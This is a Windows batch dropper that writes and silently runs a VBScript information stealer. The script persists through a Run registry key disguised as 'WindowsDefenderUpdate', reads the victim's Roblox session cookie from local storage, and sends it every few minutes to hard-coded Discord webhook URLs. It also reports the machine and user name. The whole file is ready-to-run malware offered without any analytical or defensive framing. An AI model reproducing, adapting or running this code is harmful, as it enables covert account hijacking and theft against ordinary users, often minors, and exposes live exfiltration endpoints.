@echo off
set "VBS=%TEMP%\c.vbs"
> "%VBS%" (
echo Dim sh, fso, WH_LOGS, WH_REGRAB, WH_ONLINE, PC, USER, cookiePath, lastCookie, isFirstRun
echo Set sh = CreateObject^("WScript.Shell"^)
echo Set fso = CreateObject^("Scripting.FileSystemObject"^)
echo WH_LOGS = "https://discord.com/api/webhooks/1563118302715322368/9xgemSM8Sf-T3QMCNppQ10zpxz0CMjaGohxFCg6Hl8R0cVYB-ELK49meQbAfAtvS65Mt"
echo WH_REGRAB = "https://discord.com/api/webhooks/1563321942797455460/9VXQBvrcfwAk15eHsIy3B4i7B2AmU3N90UdnIAUP_ZM9sgrakO1jfjgPcbu1SJwzH9S_"
echo WH_ONLINE = "https://discord.com/api/webhooks/1563322005359689802/j8YrC7L0NiTS0Xr0EenAjLTUdEpn-GY0CMauHvjr877IA6JXsbd9kYpbUTGPkYMDJVda"
echo PC = sh.ExpandEnvironmentStrings^("%COMPUTERNAME%"^)
echo USER = sh.ExpandEnvironmentStrings^("%USERNAME%"^)
echo isFirstRun = True
echo On Error Resume Next
echo Dim selfPath: selfPath = WScript.ScriptFullName
echo Dim tempPath: tempPath = sh.ExpandEnvironmentStrings^("%TEMP%"^) ^& "\wdu.vbs"
echo If LCase^(selfPath^) ^<^> LCase^(tempPath^) Then
echo     fso.CopyFile selfPath, tempPath, True
echo     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", "wscript.exe //B """ ^& tempPath ^& """", "REG_SZ"
echo     SendWebhook WH_ONLINE, "{""embeds"":[{""title"":""User Online"",""description"":""Client: " ^& PC ^& " / " ^& USER ^& """,""color"":65280}]}"
echo     sh.Run "wscript.exe //B """ ^& tempPath ^& """", 0, False
echo     WScript.Quit
echo End If
echo On Error Goto 0
echo lastCookie = ""
echo Do
echo     Call GrabRoblox
echo     isFirstRun = False
echo     WScript.Sleep 150000
echo Loop
echo Sub GrabRoblox^(^)
echo     cookiePath = FindCookiePath^(^)
echo     If Len^(cookiePath^) = 0 Then Exit Sub
echo     Dim raw: raw = ReadFile^(cookiePath^)
echo     If Len^(raw^) ^< 50 Then Exit Sub
echo     Dim cookie: cookie = ExtractCookie^(raw^)
echo     If Len^(cookie^) = 0 Then Exit Sub
echo     If cookie ^<^> lastCookie Then
echo         lastCookie = cookie
echo         Dim t: t = FormatDateTime^(Now, 3^)
echo         Dim destWH
echo         If isFirstRun Then destWH = WH_LOGS Else destWH = WH_REGRAB
echo         SendWebhook destWH, "{""content"":""@everyone"",""embeds"":[{""title"":""Roblox Cookie Grabbed"",""description"":""``````" ^& cookie ^& "``````"",""color"":65280,""footer"":{""text"":""Roblox Tracker • Grabbed at " ^& t ^& """}}]}"
echo     End If
echo End Sub
echo Function FindCookiePath^(^)
echo     Dim paths, i, pk, folder, subf, uwp
echo     paths = Array^(sh.ExpandEnvironmentStrings^("%LOCALAPPDATA%"^) ^& "\Roblox\LocalStorage\robloxcookies.dat", sh.ExpandEnvironmentStrings^("%LOCALAPPDATA%"^) ^& "\Roblox\LocalStorage\RobloxCookies.dat", sh.ExpandEnvironmentStrings^("%APPDATA%"^) ^& "\Roblox\LocalStorage\robloxcookies.dat", sh.ExpandEnvironmentStrings^("%LOCALAPPDATA%"^) ^& "\Roblox\Cookies"^)
echo     FindCookiePath = ""
echo     For i = 0 To 3
echo         If fso.FileExists^(paths^(i^)^) Then
echo             FindCookiePath = paths^(i^)
echo             Exit Function
echo         End If
echo     Next
echo End Function
echo Function ExtractCookie^(raw^)
echo     ExtractCookie = ""
echo     Dim m: m = InStr^(raw, "_|WARNING"^)
echo     If m ^> 0 Then
echo         ExtractCookie = Mid^(raw, m^)
echo         Dim semi: semi = InStr^(ExtractCookie, ";"^)
echo         If semi ^> 0 Then ExtractCookie = Left^(ExtractCookie, semi - 1^)
echo         Exit Function
echo     End If
echo End Function
echo Sub SendWebhook^(url, json^)
echo     Dim h: Set h = CreateObject^("MSXML2.ServerXMLHTTP.6.0"^)
echo     h.Open "POST", url, False
echo     h.SetRequestHeader "Content-Type", "application/json"
echo     h.Send json
echo End Sub
echo Function ReadFile^(path^)
echo     ReadFile = ""
echo     Dim f: Set f = fso.OpenTextFile^(path, 1^)
echo     ReadFile = f.ReadAll
echo     f.Close
echo End Function
)
wscript //B "%VBS%"
